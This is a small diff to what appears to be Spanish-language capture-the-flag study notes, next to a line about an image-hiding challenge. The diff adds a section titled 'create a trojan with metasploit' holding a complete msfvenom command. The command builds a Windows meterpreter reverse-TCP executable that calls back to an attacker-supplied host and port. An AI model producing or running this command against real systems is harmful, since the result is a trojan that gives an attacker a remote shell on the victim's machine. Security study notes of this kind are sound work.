@@ -147,7 +147,8 @@
   
   En este desafío nos darán una imagen y nos dirán que hay algo oculto, en un desafío previo habremos conseguido la contraseña.
   
-  
-  
+  Crear un troyano con metasploit
+  -------------------------------
+  msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=[IP] LPORT=[port] 
   
   
